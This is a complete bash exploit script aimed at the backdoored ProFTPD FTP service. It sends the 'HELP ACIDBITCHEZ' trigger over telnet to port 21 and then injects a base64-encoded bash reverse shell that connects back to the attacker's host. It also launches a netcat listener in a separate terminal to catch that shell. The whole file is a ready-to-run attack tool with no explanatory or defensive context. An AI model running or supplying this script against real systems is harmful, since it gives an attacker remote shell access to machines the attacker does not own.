#!/bin/bash
#
# variables
_TARGET=$1
_LOCAL=$2
_LOCALPORT=$3

if [ "$#" -ne 3 ]; then
    echo "Error: It needs three arguments."
    echo "Usage: $0 target local_host local_port"
    exit 1
fi

# Find user terminal
get_terminal() {
    # Get the parent process of the current shell
    ppid=$PPID
    while [ "$ppid" -ne 1 ]; do
        # Query the name of the parent process
        pname=$(ps -p "$ppid" -o comm=)
        if [[ "$pname" == "qterminal" || "$pname" == "gnome-terminal" || "$pname" == "konsole" || "$pname" == "xfce4-terminal" ]]; then
            #echo "$pname"
            return
        fi
        # Move to the next parent process
        ppid=$(ps -p "$ppid" -o ppid= | tr -d ' ')
    done
    echo "Unknown terminal"
    exit 1
}

payload=''
payload=$(echo "bash -i >& /dev/tcp/${_LOCAL}/${_LOCALPORT} 0>&1"|base64)

exploit() {
    {
    echo "HELP ACIDBITCHEZ"
    sleep 1;
    # Here we execute the command. It must end with a semicolon to work.
    echo "echo '${payload}'|base64 -d|bash;"
    echo exit
     } | telnet $_TARGET 21

}
# Launch a separate console since the same one closes automatically.
get_terminal
$pname -e nc -nlvp $_LOCALPORT &
exploit
